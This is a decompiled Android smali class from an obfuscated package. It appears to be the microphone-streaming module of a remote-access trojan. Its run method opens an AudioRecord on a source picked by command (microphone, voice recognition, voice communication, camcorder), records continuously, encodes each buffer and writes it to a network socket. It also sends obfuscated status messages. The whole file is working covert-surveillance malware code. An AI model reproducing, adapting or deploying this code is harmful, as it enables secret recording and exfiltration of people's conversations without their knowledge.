.class Lcmf0/c3b5bm90zq/patch/C11$33;
.super Ljava/lang/Object;

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcmf0/c3b5bm90zq/patch/C11;->f(Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/lang/String;

.field final synthetic b:Ljava/lang/String;

.field final synthetic c:Lcmf0/c3b5bm90zq/patch/C11;


# direct methods
.method constructor <init>(Lcmf0/c3b5bm90zq/patch/C11;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    iput-object p1, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iput-object p2, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->a:Ljava/lang/String;

    iput-object p3, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 14

    const-wide/16 v0, 0x53

    const-wide/16 v2, 0x43

    const/4 v4, 0x0

    :try_start_0
    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v5, v5, Lcmf0/c3b5bm90zq/patch/C11;->o:Landroid/media/AudioRecord;

    if-eqz v5, :cond_0

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v5}, Lcmf0/c3b5bm90zq/patch/C11;->m(Lcmf0/c3b5bm90zq/patch/C11;)V

    :cond_0
    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    const/4 v6, 0x1

    invoke-static {v5, v6}, Lcmf0/c3b5bm90zq/patch/C11;->c(Lcmf0/c3b5bm90zq/patch/C11;Z)Z

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->a:Ljava/lang/String;

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(Ljava/lang/String;)Ljava/lang/Integer;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/Integer;->intValue()I

    move-result v8

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v6

    iget-object v7, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v7}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v7

    invoke-static {v8, v6, v7}, Landroid/media/AudioRecord;->getMinBufferSize(III)I

    move-result v6

    iput v6, v5, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    iget-object v5, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v5, v5, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    new-array v5, v5, [B

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    const-string v7, "DEFAULT"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_1

    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x0

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    :goto_0
    iput-object v13, v12, Lcmf0/c3b5bm90zq/patch/C11;->o:Landroid/media/AudioRecord;

    goto/16 :goto_1

    :cond_1
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    const-string v7, "MIC"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_2

    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x1

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_2
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    const-string v7, "VOICE_RECOGNITION"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_3

    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x6

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_3
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    const-string v7, "VOICE_COMMUNICATION"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_4

    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x7

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto :goto_0

    :cond_4
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->b:Ljava/lang/String;

    const-string v7, "CAMCORDER"

    invoke-virtual {v6, v7}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_5

    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x5

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto/16 :goto_0

    :cond_5
    iget-object v12, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    new-instance v13, Landroid/media/AudioRecord;

    const/4 v7, 0x1

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->B(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v9

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->C(Lcmf0/c3b5bm90zq/patch/C11;)I

    move-result v10

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v11, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    move-object v6, v13

    invoke-direct/range {v6 .. v11}, Landroid/media/AudioRecord;-><init>(IIIII)V

    goto/16 :goto_0

    :goto_1
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v7, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v7, v7, Lcmf0/c3b5bm90zq/patch/C11;->o:Landroid/media/AudioRecord;

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v8, v8, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    invoke-static {v6, v7, v8}, Lcmf0/c3b5bm90zq/patch/C11;->a(Lcmf0/c3b5bm90zq/patch/C11;Landroid/media/AudioRecord;I)Z

    move-result v6

    if-nez v6, :cond_6

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6, v4}, Lcmf0/c3b5bm90zq/patch/C11;->c(Lcmf0/c3b5bm90zq/patch/C11;Z)Z

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v7, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v7, v8, v2, v3}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "busy"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v7, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v7, v8, v0, v1}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, "null"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    :goto_2
    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    goto :goto_3

    :cond_6
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v6, v6, Lcmf0/c3b5bm90zq/patch/C11;->o:Landroid/media/AudioRecord;

    invoke-virtual {v6}, Landroid/media/AudioRecord;->startRecording()V

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    const-wide/16 v7, 0x0

    invoke-static {v6, v7, v8}, Lcmf0/c3b5bm90zq/patch/C11;->c(Lcmf0/c3b5bm90zq/patch/C11;J)J

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v7, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v9, 0x42

    invoke-static {v7, v8, v9, v10}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v7, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v9, 0x68

    invoke-static {v7, v8, v9, v10}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget v7, v7, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    invoke-static {v7}, Ljava/lang/String;->valueOf(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->a:Ljava/lang/String;

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    goto :goto_2

    :goto_3
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/C11;->D(Lcmf0/c3b5bm90zq/patch/C11;)Z

    move-result v6

    if-eqz v6, :cond_8

    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v7, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v7, v7, Lcmf0/c3b5bm90zq/patch/C11;->o:Landroid/media/AudioRecord;

    array-length v8, v5

    invoke-virtual {v7, v5, v4, v8}, Landroid/media/AudioRecord;->read([BII)I

    move-result v7

    iput v7, v6, Lcmf0/c3b5bm90zq/patch/C11;->p:I

    new-instance v6, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v6}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v6}, Ljava/io/ByteArrayOutputStream;->reset()V

    array-length v7, v5

    invoke-virtual {v6, v5, v4, v7}, Ljava/io/ByteArrayOutputStream;->write([BII)V

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v8, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    const-wide/16 v10, 0x44

    invoke-static {v8, v9, v10, v11}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->E(Lcmf0/c3b5bm90zq/patch/C11;)J

    move-result-wide v8

    invoke-virtual {v7, v8, v9}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-static {v4}, Ljava/lang/String;->valueOf(C)Ljava/lang/String;

    move-result-object v8

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v7, Lcmf0/c3b5bm90zq/patch/C11;->e:Ljava/lang/String;

    invoke-virtual {v9, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    new-instance v9, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v9}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v6}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    invoke-virtual {v9, v6}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    invoke-static {v6}, Lcmf0/c3b5bm90zq/patch/a;->a([B)[B

    move-result-object v6

    array-length v7, v6

    new-instance v9, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v9}, Ljava/io/ByteArrayOutputStream;-><init>()V

    invoke-static {v7}, Ljava/lang/Integer;->toString(I)Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v8}, Ljava/lang/String;->getBytes()[B

    move-result-object v7

    invoke-virtual {v9, v7}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v9, v6}, Ljava/io/ByteArrayOutputStream;->write([B)V

    invoke-virtual {v9}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v6

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->k()Ljava/lang/Object;

    move-result-object v7

    monitor-enter v7
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_0 .. :try_end_0} :catch_1

    :try_start_1
    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    if-eqz v8, :cond_7

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v8

    array-length v9, v6

    mul-int/lit8 v9, v9, 0xf

    invoke-virtual {v8, v9}, Ljava/net/Socket;->setSendBufferSize(I)V

    invoke-static {}, Lcmf0/c3b5bm90zq/patch/C11;->h()Ljava/net/Socket;

    move-result-object v8

    invoke-virtual {v8}, Ljava/net/Socket;->getOutputStream()Ljava/io/OutputStream;

    move-result-object v8

    sput-object v8, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    sget-object v8, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    array-length v9, v6

    invoke-virtual {v8, v6, v4, v9}, Ljava/io/OutputStream;->write([BII)V

    sget-object v6, Lcmf0/c3b5bm90zq/patch/C11;->d:Ljava/io/OutputStream;

    invoke-virtual {v6}, Ljava/io/OutputStream;->flush()V

    :cond_7
    iget-object v6, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    iget-object v8, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v8}, Lcmf0/c3b5bm90zq/patch/C11;->E(Lcmf0/c3b5bm90zq/patch/C11;)J

    move-result-wide v8

    const-wide/16 v10, 0x1

    add-long/2addr v8, v10

    invoke-static {v6, v8, v9}, Lcmf0/c3b5bm90zq/patch/C11;->c(Lcmf0/c3b5bm90zq/patch/C11;J)J

    monitor-exit v7

    goto/16 :goto_3

    :catchall_0
    move-exception v5

    monitor-exit v7
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    throw v5
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catch Ljava/lang/OutOfMemoryError; {:try_start_2 .. :try_end_2} :catch_1

    :catch_0
    move-exception v5

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    sget-wide v7, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v7, v8, v2, v3}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v2, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-wide v2, Lcmf0/c3b5bm90zq/patch/C11;->m:J

    invoke-static {v2, v3, v0, v1}, Lcmf0/c3b5bm90zq/patch/C11;->a(JJ)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Lcmf0/c3b5bm90zq/patch/C11;->f:Ljava/lang/String;

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "null"

    invoke-virtual {v6, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v0}, Lcmf0/c3b5bm90zq/patch/C11;->a(Ljava/lang/String;)V

    iget-object v0, p0, Lcmf0/c3b5bm90zq/patch/C11$33;->c:Lcmf0/c3b5bm90zq/patch/C11;

    invoke-static {v0, v4}, Lcmf0/c3b5bm90zq/patch/C11;->c(Lcmf0/c3b5bm90zq/patch/C11;Z)Z

    :catch_1
    :cond_8
    return-void
.end method
